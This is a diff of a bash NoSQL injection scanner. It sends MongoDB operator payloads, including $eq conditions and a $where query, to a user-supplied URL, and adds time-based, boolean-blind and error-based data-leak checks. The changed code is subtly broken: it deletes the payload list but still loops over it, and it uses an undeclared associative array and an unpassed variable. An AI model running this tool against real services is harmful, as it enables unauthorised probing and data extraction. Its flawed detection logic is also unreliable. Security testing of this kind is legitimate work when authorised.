@@ -7,6 +7,7 @@ proxy=""
 custom_headers=""
 user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 output=""
+baseline=""
 
 print_banner() {
     local banner=(
@@ -57,57 +58,212 @@ encode_payload() {
     urlencode "$payload"
 }
 
-detect_nosqli() {
+collect_baseline() {
     local url="$1"
-    local payloads=(
-        '{"$ne": null}'
-        '{"$gt": ""}'
-        '{"$regex": "^a"}'
-        '{"$eq": "a"}'
-        '{"$in": ["a", "b", "c"]}'
-        '{"$not": {"$type": 2}}'
-        '{"username": {"$regex": "^admin"}}'
-    )
+    echo "[+] Collecting baseline response..."
+    baseline=$(make_request "$url")
+    echo "[+] Baseline collected."
+}
 
-    echo "[+] Detecting basic NoSQL injection vulnerabilities..."
+execute_payloads() {
+    local url="$1"
+    local payloads=("${@:2}")
+
     for payload in "${payloads[@]}"; do
         full_url="$url?filter=$(encode_payload "$payload")"
         response=$(make_request "$full_url")
-        if [[ "$response" =~ "error" || "$response" =~ "found" ]]; then
-            echo "[!] Potential NoSQL Injection found with payload: $payload"
+
+        # Store payload and response pairs
+        payloads_data["$payload"]="$response"
+    done
+}
+
+analyze_string_match() {
+    local payload="$1"
+    local response="$2"
+
+    if [[ "$response" =~ "error" || "$response" =~ "exception" ]]; then
+        echo "[!] Potential vulnerability detected (string match)"
+        return 0
+    fi
+
+    return 1
+}
+
+analyze_length_diff() {
+    local baseline_len=${#baseline}
+    local payload_len=${#payloads_data["$payload"]}
+
+    local diff=$((payload_len - baseline_len))
+
+    if (( diff > 50 || diff < -50 )); then
+        echo "[!] Potential vulnerability detected (length diff: $diff)"
+        return 0
+    fi
+
+    return 1
+}
+
+analyze_error_indicators() {
+    local response="$1"
+
+    if [[ "$response" =~ "exception" || "$response" =~ "stacktrace" ]]; then
+        echo "[!] Potential vulnerability detected (error indicator)"
+        return 0
+    fi
+
+    return 1
+}
+
+analyze_success_indicators() {
+    local response="$1"
+
+    if [[ "$response" =~ "admin" || "$response" =~ "user" ]]; then
+        echo "[!] Potential vulnerability detected (success indicator)"
+        return 0
+    fi
+
+    return 1
+}
+
+analyze_regex() {
+    local response="$1"
+
+    if [[ "$response" =~ "ObjectId" || "$response" =~ "ISODate" ]]; then
+        echo "[!] Potential vulnerability detected (regex match)"
+        return 0
+    fi
+
+    return 1
+}
+
+confirm_vulnerability() {
+    local payload="$1"
+    local response="$2"
+
+    local indicators=()
+
+    if analyze_string_match "$payload" "$response"; then
+        indicators+=("string_match")
+    fi
+
+    if analyze_length_diff "$payload" "$response"; then
+        indicators+=("length_diff")
+    fi
+
+    if analyze_error_indicators "$response"; then
+        indicators+=("error_indicator")
+    fi
+
+    if analyze_success_indicators "$response"; then
+        indicators+=("success_indicator")
+    fi
+
+    if analyze_regex "$response"; then
+        indicators+=("regex_match")
+    fi
+
+    if (( ${#indicators[@]} >= 2 )); then
+        echo "[!] Confirmed vulnerability with payload: $payload"
+        return 0
+    fi
+
+    return 1
+}
+
+analyze_time_delay() {
+    local url="$1"
+    local true_payload="$2"
+    local false_payload="$3"
+
+    echo "[+] Testing for time-based blind injection..."
+
+    # Measure response time for true condition
+    start_time=$(date +%s)
+    make_request "$url?filter=$(encode_payload "$true_payload")" > /dev/null
+    end_time=$(date +%s)
+    true_delay=$((end_time - start_time))
+
+    # Measure response time for false condition
+    start_time=$(date +%s)
+    make_request "$url?filter=$(encode_payload "$false_payload")" > /dev/null
+    end_time=$(date +%s)
+    false_delay=$((end_time - start_time))
+
+    # Compare delays
+    if (( true_delay > false_delay + 3 )); then
+        echo "[!] Time-based blind injection detected (delay: $true_delay)"
+        return 0
+    fi
+
+    return 1
+}
+
+analyze_boolean_blind() {
+    local url="$1"
+    local true_payload="$2"
+    local false_payload="$3"
+
+    true_response=$(make_request "$url?filter=$(encode_payload "$true_payload")")
+    false_response=$(make_request "$url?filter=$(encode_payload "$false_payload")")
+
+    if [[ "$true_response" != "$false_response" ]]; then
+        echo "[!] Boolean-based blind injection detected"
+        return 0
+    fi
+
+    return 1
+}
+
+analyze_error_exfiltration() {
+    local url="$1"
+    local field="$2"
+    local query='{\"$where\": \"this.'"$field"'.length > 1000\"}'
+
+    echo "[+] Testing for error-based exfiltration..."
+    response=$(make_request "$url?filter=$(encode_payload "$query")")
+
+    if [[ "$response" =~ "error" || "$response" =~ "exception" ]]; then
+        echo "[!] Error response may contain leaked data:"
+        echo "$response"
+        return 0
+    fi
+
+    return 1
+}
+
+detect_nosqli() {
+    local url="$1"
+
+    echo "[+] Collecting baseline response..."
+    collect_baseline "$url"
+
+    echo "[+] Executing payloads..."
+    execute_payloads "$url" "${payloads[@]}"
+
+    echo "[+] Analyzing responses..."
+    for payload in "${payloads[@]}"; do
+        response="${payloads_data[$payload]}"
+        if confirm_vulnerability "$payload" "$response"; then
             output+="\n[VULNERABLE] $payload"
-            return 0
         fi
     done
+
     echo "[-] No basic NoSQL Injection vulnerabilities detected."
-    return 1
 }
 
 detect_blind_nosqli() {
     local url="$1"
-    local true_condition='{"$eq": 1}'
-    local false_condition='{"$eq": 0}'
+    local true_payload='{"$eq": 1}'
+    local false_payload='{"$eq": 0}'
 
-    echo "[+] Testing for Blind NoSQL Injection..."
-    output+="\n\n[BLIND TESTING]"
-
-    # Time-based check
-    start_time=$(date +%s)
-    make_request "$url?filter=$(encode_payload "$true_condition")" > /dev/null
-    end_time=$(date +%s)
-    response_time=$((end_time - start_time))
-
-    if (( response_time > 3 )); then
-        echo "[!] Potential Time-Based Blind NoSQL Injection detected (delay: ${response_time}s)"
-        output+="\n[!] Time-Based Blind detected (delay: ${response_time}s)"
+    echo "[+] Testing for time-based blind injection..."
+    if analyze_time_delay "$url" "$true_payload" "$false_payload"; then
+        output+="\n[!] Time-Based Blind detected"
     fi
 
-    # Boolean-based check
-    true_response=$(make_request "$url?filter=$(encode_payload "$true_condition")")
-    false_response=$(make_request "$url?filter=$(encode_payload "$false_condition")")
-
-    if [[ "$true_response" != "$false_response" ]]; then
-        echo "[!] Potential Boolean-Based Blind NoSQL Injection detected"
+    echo "[+] Testing for boolean-based blind injection..."
+    if analyze_boolean_blind "$url" "$true_payload" "$false_payload"; then
         output+="\n[!] Boolean-Based Blind detected"
     fi
 }
@@ -261,7 +417,7 @@ generate_report() {
 main() {
     print_banner
 
-    read -p "Enter target URL (e.g., https://example.com/api): " url
+    read -p "Enter target URL (e.g., https://example.com/api   ): " url
     url="${url%/}"
 
     read -p "Session cookie (if any): " session_cookie
